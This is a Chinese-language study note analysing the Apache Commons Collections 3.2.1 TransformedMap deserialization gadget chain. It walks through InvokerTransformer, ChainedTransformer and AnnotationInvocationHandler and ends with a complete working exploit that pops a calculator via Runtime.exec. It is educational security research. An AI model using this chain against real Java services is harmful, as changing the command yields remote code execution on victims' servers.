---
title: 「JAVA反序列化学习笔记1」TransformedMap链分析
tags: 
---

## 0x01.前言

最近开始学习java反序列化，已下文章作为总结笔记，有理解的不到位的地方表哥们请多指教~其反序列化漏洞点存在于`Apache commons-collections`组件中，我使用的是3.2.1版本，使用maven搭建
在学习之前需要了解java基础语法，java反射等。

下面是配置地址

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

当前触发版本：commons-collections 3.2.1 JDK1.7u21
先来了解一下`TransformedMap`类，该类最终也是实现了`Map`接口，主要的作用是在对其集合的元素进行增加，删除或修改时调用`transform`方法进行特定的修饰变换，而这个`transform`是我们自己定义的。

## 0x02.TransformedMap触发链分析

### **InvokerTransformer**

要利用java反序列化漏洞，不可避免的需要java反射，一般都会通过反射去构造poc

先来看InvokerTransformer类，该类位于

```
org.apache.commons.collections.functors.InvokerTransformer
```

![img](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210923180235.png)

他是一切的起点，这里可以通过反射去调用任意类的任意函数，

主要来看他的公有构造方法和transform函数

```java
private final String iMethodName;
private final Class[] iParamTypes;
private final Object[] iArgs;

public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    this.iMethodName = methodName; //要调用的方法名
    this.iParamTypes = paramTypes; //设置要调用的方法的参数类型数组
    this.iArgs = args; //要调用的方法实参数组
}


public Object transform(Object input) { //调用时传入Object类型对象
    if (input == null) {
        return null;
    } else {
        try {
            Class cls = input.getClass(); //获取该对象的Class类对象
            //通过反射获取Method对象,调用的方法名和参数类型这里通过上面的构造方法都可控
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            //将input对象传入,利用invode方法执行我们指定的函数并传参
            return method.invoke(input, this.iArgs);
        } catch (NoSuchMethodException var4) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException var5) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException var6) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
        }
    }
}
```

然后通过构造简单的语句即可调用造成命令执行

```java
InvokerTransformer invokerTransformer = new InvokerTransformer(
        "exec",new Class[]{String.class},new Object[]{"calc"}
);

invokerTransformer.transform(Runtime.getRuntime());
```

exec函数有一个形参，类型为String.class，传入参数为calc，弹出计算器

![img](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210923180231.png)

但是在实际情况中，是不会在逻辑代码中直接调用该类的transform方法，并且该值还是我们可控的..这基本不可能遇到。所以我们需要找寻其他类，看在哪个类中调用到了其transform方法。

### **TransformedMap**

于是就找到了TransformedMap类，该类位于

```
rg.apache.commons.collections.map.TransformedMap
```

![img](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210923180226.png)

来看下该类的构造函数，为protected，外部包无法调用

```java
protected final Transformer keyTransformer; //定义的常量
protected final Transformer valueTransformer;

protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map); //传入一个Map
    this.keyTransformer = keyTransformer; //key发生变化触发的Transformer
    this.valueTransformer = valueTransformer; //value发生变化触发的Transformer
}
```

需要通过decorate函数获取该类对象，

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

然后来看checkSetValue方法，该方法调用了valueTransformer常量的transform方法，该valueTransformer对象是声明TransformedMap对象时构造函数传入的Transformer，对应value发生改变时触发

```java
protected Object checkSetValue(Object value) {
    return this.valueTransformer.transform(value);
}
```

这时候发现checkSetValue并不是setValue，那怎么在setValue时触发呢，

### **AbstractInputCheckedMapDecorator**

TransformedMap继承AbstractInputCheckedMapDecorator，所有的重要方法都在其中进行了重写。
如entrySet，iterator，next，下面分析下该类代码，这里不涉及的一些函数就去掉了。

```java
Map outerMap = TransformedMap.decorate(innerMap,null,chain) ; //构造TransformedMap对象

Map.Entry elEntry = (Map.Entry) outerMap.entrySet().iterator().next() ;
elEntry.setValue("test") ;
```

通过上述代码来对照可能理解更方便些，

```java
public abstract class AbstractInputCheckedMapDecorator extends AbstractMapDecorator {

    protected abstract Object checkSetValue(Object var1); //checkSetValue在TransformedMap中重写
        //重写entrySet方法
    public Set entrySet() {
        EntrySet entrySet = new EntrySet(this.map.entrySet(), this); //调用重写的内部类EntrySet构造方法
        return (Set)entrySet; //返回EntrySet对象
    }
    
    //定义内部类，MapEntry，该类最终实现了Entry接口
    static class MapEntry extends AbstractMapEntryDecorator {
        private final AbstractInputCheckedMapDecorator parent;
        
        //构造函数
        protected MapEntry(Entry entry, AbstractInputCheckedMapDecorator parent) {
            super(entry);
            this.parent = parent;
        }
        
        //重要的setValue方法,在这里重写，调用了当前AbstractInputCheckedMapDecorator对象的checkSetValue方法
        //对应上方TransformedMap类重写的checkSetValue方法，触发transform方法
        public Object setValue(Object value) {
            value = this.parent.checkSetValue(value); //漏洞触发点
            return this.entry.setValue(value);
        }
    }

    //定义内部类EntrySetIterator，最终实现了Iterator接口，主要重写了迭代器
    static class EntrySetIterator extends AbstractIteratorDecorator {
        private final AbstractInputCheckedMapDecorator parent;
        
        //构造方法
        protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) {
            super(iterator);
            this.parent = parent;
        }
        
        //重写next方法，在遍历迭代器时调用
        public Object next() {    
            Entry entry = (Entry)this.iterator.next();
            //在调用next进行迭代获取时调用AbstractInputCheckedMapDecorator中定义的MapEntry类。返回MapEntry对象
            return new AbstractInputCheckedMapDecorator.MapEntry(entry, this.parent);
        }
    }
    
        //定义EntrySet方法，最终实现了Set接口
    static class EntrySet extends AbstractSetDecorator {
        private final AbstractInputCheckedMapDecorator parent;
        //构造方法，在上面entrySet方法中调用到这里
        protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) {
            super(set);
            this.parent = parent;
        }
        
                //重写iterator方法，生成迭代器时会调用
        public Iterator iterator() {
            //调用AbstractInputCheckedMapDecorator中定义的EntrySetIterator类构造方法。返回EntrySetIterator对象
            //this.collection为构造函数中传入的set
            return new AbstractInputCheckedMapDecorator.EntrySetIterator(this.collection.iterator(), this.parent);
        }

    }
}
```

根据构造代码总体分析一下流程

```java
InvokerTransformer invokerTransformer =
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
Map innerMap = new HashMap() ;
innerMap.put("name", "Runtime.getRuntime()") ;
Map outerMap = TransformedMap.decorate(innerMap,null,invokerTransformer) ;

Map.Entry elEntry = (Map.Entry) outerMap.entrySet().iterator().next() ;
elEntry.setValue(Runtime.getRuntime()) ;
```

这里的直接传入invokerTransformer并不是准确的，因为setValue必须传入Runtime.getRuntime()才能成功触发计算器，我们这里先分析漏洞触发，构造Transformer之后在分析。

来看触发链:

```
TransformedMap.decorate()
    ->父类AbstractInputCheckedMapDecorator.entrySet()
        ->内部类EntrySet.EntrySet(构造函数) ->内部类EntrySet.iterator()
            ->内部类EntrySetIterator.EntrySetIterator(构造函数)->内部类EntrySetIterator.next()
                ->内部类MapEntry.MapEntry(构造函数)->内部类MapEntry.setValue()
->TransformedMap.checkSetValue()
->InvokerTransformer.transform()触发漏洞
```

### **Transformer反射链构造**

这时候发现如果成功触发，setValue的值必须是Runtime的对象。这必然是不科学的..我们无法保证实现了setValue的同时这个值还必须为Runtime对象

```java
Class cls = input.getClass(); 
//通过反射获取Method对象,调用的方法名和参数类型这里通过上面的构造方法都可控
Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
//将input对象传入,利用invode方法执行我们指定的函数并传参
return method.invoke(input, this.iArgs);
```

这时候来看invokerTransformer的transform方法如果不传入Runtime对象是无法一次性构造利用链的，必须循环多次构造才行

完整的构造链

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"calc"})
};
Transformer chain = new ChainedTransformer(transformers) ;
```

先来看ChainedTransformer类

```java
//构造函数
public ChainedTransformer(Transformer[] transformers) {
    this.iTransformers = transformers; //传入transformers数组
}

//进行循环调用
public Object transform(Object object) {
    for(int i = 0; i < this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }
    return object;
}
```

会将我们构造的transformers数组传入，进行循环调用，每次会将上次调用返回的object当做transform的参数传入

第一次传入的object的值为setValue('test') 的值，为test

这时候又需要ConstantTransformer类了，因为第一次使用InvokerTransformer，如果setValue的值为test，input.getClass()获取是String类型的Class对象。而我们需要的是Runtime

来看ConstantTransformer类

```java
//构造函数，获取传入的Object对象
public ConstantTransformer(Object constantToReturn) {
    this.iConstant = constantToReturn;
}

//transform方法直接返回this.iConstant对象，同setValue的值input毫无关系
public Object transform(Object input) {
    return this.iConstant;
}
```

这样就跟setValue的值没有任何关系了，所以第一次调用的必须是ConstantTransformer类

那这时候又有问题了，按下方的代码写就可以直接触发了，第一次循环得到Runtime对象，第二次直接反射调用exec函数执行命令即可

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.getRuntime()),
        new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"calc"})
};
Transformer chain = new ChainedTransformer(transformers) ;
```

这里的确可以触发，但是在序列化时会报错。因为Runtime未实现Serializable接口，无法序列化而Class类实现了Serializable，可以序列化，所有必须是Runtime.class

而这时候第一次input.getClass()会返回 Runtime.class 的class对象..就是Class类的class对象了..所以这时候构造就很繁琐了，必须通过反射获取到Class类的Method对象，然后通过invoke获取到Runtime对象，在调用exec方法执行命令

所以

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"calc"})
};
Transformer chain = new ChainedTransformer(transformers) ;
```

等同于

```java
Class runtimeClass = Runtime.class;
Class cls = runtimeClass.getClass(); //相当于获取了Class类的class对象
System.out.println(cls);

//获取getMethod方法的Method对象，
//getMethod方法有两个参数，一个String.class是执行的方法名称 ，Class[].class是参数类型...确实有点绕这里
Method method = cls.getMethod("getMethod", String.class, Class[].class);
//调用invoke获取Method对象，要执行的是Runtime的getRuntime方法，参数没有则写成了null，runtimeClass为Runtime的class对象
Object o = method.invoke(runtimeClass,new Object[]{"getRuntime",null});
System.out.println(o.getClass());
/*
执行到这里其实等于下面代码中获取到Method对象test了，接下来我们需要执行invoke函数，这需要下一轮循环了
Class testc = Runtime.class;
Method test = testc.getMethod("getRuntime");
*/

Class cls2 = o.getClass();//相当于获取了Method类的Class对象
//获取Method对象的invoke方法，进行调用getRuntime，返回Runtime对象
//invoke方法有两个参数,一个Object.class是传入当前对象，Object[].class为实参
Method method1 = cls2.getMethod("invoke",Object.class,Object[].class);
//执行，相当于调用了Runtime的getRuntime方法，返回了Runtime对象
Object o1 = method1.invoke(o,null,null);
/*
这里就相当于调用invoke函数获取到了Runtime对象
Runtime testo = (Runtime)test.invoke(testc);
testo.exec("calc");
*/

System.out.println(o1.getClass());
Class cls3 = o1.getClass();//Runtime类的class对象，可以直接反射调用exec方法执行命令了
Method method2 = cls3.getMethod("exec",String.class);
method2.invoke(o1,"calc");
```

![img](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210923180657.png)

最后画个图理解一下整个链...
完整的代码是

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"calc"})
};
Transformer chain = new ChainedTransformer(transformers) ;

Map innerMap = new HashMap() ;
innerMap.put("name", "666") ;
Map outerMap = TransformedMap.decorate(innerMap,null,chain) ;

Map.Entry elEntry = (Map.Entry) outerMap.entrySet().iterator().next() ;
elEntry.setValue("test") ;
```

![img](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210923180723.jpg)

## 0x03.AnnotationInvocationHandler触发反序列化

在明白TransformedMap利用链后，我们需要找到某个类，进行了反序列化操作，并且有对Map进行setValue的操作，而Map需要我们可控
来看AnnotationInvocationHandler类

位于

```
sun.reflect.annotation.AnnotationInvocationHandler
```

来看他的构造方法，无法在不同包调用，所以获取对象需要使用到反射的暴破(可以直接在外部调用或设置私有属性）

```java
//一个注解类型参数,需要我们传入一个注解类型
//一个Map类型参数，而这个Map正好我们可控
AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
    this.type = var1; 
    this.memberValues = var2;
}
```

该类重写了readObject方法，在反序列化该对象时会调用

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject();
    AnnotationType var2 = null;
    try {
        var2 = AnnotationType.getInstance(this.type);
    } catch (IllegalArgumentException var9) {
        return;
    }
    Map var3 = var2.memberTypes(); //会返回一个注解元素的键值对
    Iterator var4 = this.memberValues.entrySet().iterator(); //获取Map集合迭代器进行循环，这里跟流程图中的步骤是相同的
    while(var4.hasNext()) {
        Entry var5 = (Entry)var4.next();
        String var6 = (String)var5.getKey(); //获取对应的Key名
        Class var7 = (Class)var3.get(var6); //根据我们构造的Map对应的Key的名字从var3中寻找对应Key的值
        //所以我们定义的Map的key必须对应注注解元素的键值对中的Key，找不到则会获取为null
        if (var7 != null) {
            Object var8 = var5.getValue(); //获取value
            if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { //如果类型不相同则进入
                //对map进行了setValue操作，触发利用链
                var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
            }
        }
    }
}
```

构造代码

```java
Map map = new HashMap();
map.put("value", "sijidou"); //这里构造的Key值必须和Target中的value相同
Map transformedMap = TransformedMap.decorate(map, null, transformerChain);

//通过反射获取对象
Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
Object instance = ctor.newInstance(Target.class, transformedMap);
```

下图为Target

![img](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210923180839.png)

完整利用代码

```java
Transformer[] transformers2 = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
Transformer transformerChain = new ChainedTransformer(transformers2);


Map map = new HashMap();
map.put("value", "test");
Map transformedMap = TransformedMap.decorate(map, null, transformerChain);


Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
Object instance = ctor.newInstance(Target.class, transformedMap);


//序列化
FileOutputStream fileOutputStream = new FileOutputStream("serialize.txt");
ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
objectOutputStream.writeObject(instance);
objectOutputStream.close();


//反序列化
FileInputStream fileInputStream = new FileInputStream("serialize.txt");
ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
Object result = objectInputStream.readObject();
objectInputStream.close();
System.out.println(result);
```

完整触发链：

```java
->ObjectInputStream.readObject()
    ->AnnotationInvocationHandler.readObject()->触发AnnotationInvocationHandler对象的readObject方法
        ->transformedMap.entrySet()
        ->transformedMap.iterator()
        ->transformedMap.next()
        ->transformedMap.setValue()
        ->transformedMap.checkSetValue()->该方法中会触发ChainedTransformer.transform方法
             ->ChainedTransformer.transform()->进行for循环调用Transformer对象数组的transform方法
                   -> ConstantTransformer.transform()->获取Runtime.class对象
                   -> InvokerTransformer.transform()
                            ->Method.invoke()
                            ->Class.getMethod()->会获取Method对象，要调用的方法是getRuntime
                   ->InvokerTransformer.transform()
                            ->Method.invoke()
                            ->Runtime.getRuntime()->通过Method对象调用Runtime.getRuntime()，获取了Runtime对象
                   ->InvokerTransformer.transform()
                            ->Method.invoke()
                            ->Runtime.exec()->通过Runtime对象调用exec方法
```

注意：

在JDK1.8中(8u71)后官方修改了AnnotationInvocationHandler的readObject方法，在P牛的Java安全漫谈中也提到过，是因为修改后不在使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，所以无法触发

![img](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210923180928.png)

### 参考文章：

https://xz.aliyun.com/t/7031

https://www.cnblogs.com/ssooking/p/5875215.html

P牛Java**安全漫谈系列**